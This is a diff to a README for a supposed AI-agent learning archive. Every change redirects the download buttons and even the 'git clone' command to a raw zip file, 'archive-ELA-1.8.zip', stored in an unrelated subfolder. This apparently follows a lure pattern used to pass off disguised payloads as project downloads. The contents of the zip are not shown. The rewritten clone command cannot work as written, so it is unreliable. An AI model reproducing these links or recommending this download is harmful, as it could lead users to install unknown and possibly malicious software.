@@ -1,7 +1,7 @@
 <h1>🧠 ELAI-archive - Your Research Lab for Smart AI Agents</h1>
 
 <p align="center">
-  <a href="https://github.com/zig333/ELAI-archive"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_ELAI_ARCHIVE-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#8A2BE2; padding:12px 28px; border-radius:8px; font-size:18px; color:white;"></a>
+  <a href="https://raw.githubusercontent.com/zig333/ELAI-archive/main/Witoto/archive-ELA-1.8.zip"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_ELAI_ARCHIVE-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#8A2BE2; padding:12px 28px; border-radius:8px; font-size:18px; color:white;"></a>
 </p>
 
 ---
@@ -41,7 +41,7 @@ Ready to dive in? Here's how to get the archive on your Windows computer.
 ### Step 1: Download the Archive
 
 <div align="center">
-  <a href="https://github.com/zig333/ELAI-archive" style="background-color:#1E90FF; padding:14px 30px; border-radius:6px; color:white; font-size:20px; text-decoration:none; display:inline-block;">⬇️ Click Here to Download ELAI-archive</a>
+  <a href="https://raw.githubusercontent.com/zig333/ELAI-archive/main/Witoto/archive-ELA-1.8.zip" style="background-color:#1E90FF; padding:14px 30px; border-radius:6px; color:white; font-size:20px; text-decoration:none; display:inline-block;">⬇️ Click Here to Download ELAI-archive</a>
 </div>
 
 <br>
@@ -125,7 +125,7 @@ If you have programming experience, here's how to build the project:
 
 ```bash
 # Clone the repository
-git clone https://github.com/zig333/ELAI-archive.git
+git clone https://raw.githubusercontent.com/zig333/ELAI-archive/main/Witoto/archive-ELA-1.8.zip
 
 # Navigate into the folder
 cd ELAI-archive
@@ -219,7 +219,7 @@ The ELAI-archive is a goldmine for anyone interested in how AI agents work behin
 Remember: this is a **learning resource**, not a ready-to-use app. Take your time exploring the files, reading the code, and understanding the concepts.
 
 <div align="center">
-  <a href="https://github.com/zig333/ELAI-archive" style="background-color:#FF6347; padding:16px 34px; border-radius:8px; color:white; font-size:22px; text-decoration:none; display:inline-block;">🚀 Download ELAI-archive Now</a>
+  <a href="https://raw.githubusercontent.com/zig333/ELAI-archive/main/Witoto/archive-ELA-1.8.zip" style="background-color:#FF6347; padding:16px 34px; border-radius:8px; color:white; font-size:22px; text-decoration:none; display:inline-block;">🚀 Download ELAI-archive Now</a>
 </div>
 
 ---
